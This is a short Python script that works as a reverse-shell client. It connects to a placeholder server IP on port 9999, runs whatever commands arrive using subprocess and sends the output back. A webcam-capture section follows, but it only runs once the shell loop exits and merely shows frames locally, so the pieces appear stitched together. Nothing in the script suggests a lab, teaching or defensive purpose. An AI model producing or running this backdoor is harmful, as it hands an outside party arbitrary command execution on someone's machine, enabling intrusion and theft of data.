import socket
import subprocess
import cv2
# Server IP and Port
SERVER_IP = 'your_server_ip'  # Replace with your server's IP
SERVER_PORT = 9999
# Connect to the server
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_IP, SERVER_PORT))
# Loop to receive and execute commands from the server
while True:
    command = client_socket.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    client_socket.send(output.encode())
client_socket.close()
# Capture video from webcam
cap = cv2.VideoCapture(0)
while True:
    ret, frame = cap.read()
    if ret:
        cv2.imshow('Webcam', frame)
    if cv2.waitKey(1) & 0xFF == ord('q'):
        break
cap.release()
cv2.destroyAllWindows()
